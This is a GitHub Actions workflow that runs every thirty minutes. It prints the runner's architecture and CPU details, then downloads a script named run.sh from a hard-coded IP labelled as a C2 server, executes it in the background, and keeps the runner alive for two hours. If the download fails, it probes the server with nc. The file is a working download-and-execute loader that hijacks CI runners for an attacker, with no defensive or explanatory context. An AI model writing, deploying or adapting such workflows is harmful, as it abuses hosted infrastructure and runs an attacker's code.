name: Architecture Detection + Payload Runner

on:
  schedule:
    - cron: '*/30 * * * *'
  workflow_dispatch:

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
    - name: Detect & Run
      run: |
        echo "=========================================="
        echo "Architecture Detection & Payload Runner"
        echo "=========================================="
        
        # Show architecture
        echo "System: $(uname -a)"
        echo "Architecture: $(uname -m)"
        echo "CPU Info: $(lscpu | grep -E 'Model name|Architecture' | head -2)"
        echo ""
        
        # Download and run
        cd /tmp
        C2="16.171.16.1"
        
        echo "[*] Downloading from $C2..."
        wget "http://$C2/run.sh" -O run.sh 2>/dev/null || \
        curl -s "http://$C2/run.sh" -o run.sh
        
        if [ -s run.sh ]; then
            echo "✅ Payload downloaded ($(wc -c < run.sh) bytes)"
            chmod +x run.sh
            echo "Payload content:"
            head -10 run.sh
            echo ""
            echo "[*] Executing payload..."
            ./run.sh &
            echo "✅ Payload executed"
        else
            echo "❌ Failed to download"
            # Test if C2 is reachable
            nc -zv "$C2" 80 2>&1 || echo "C2 not reachable"
        fi
        
        echo "=========================================="
        echo "Keeping alive for 2 hours..."
        sleep 7200
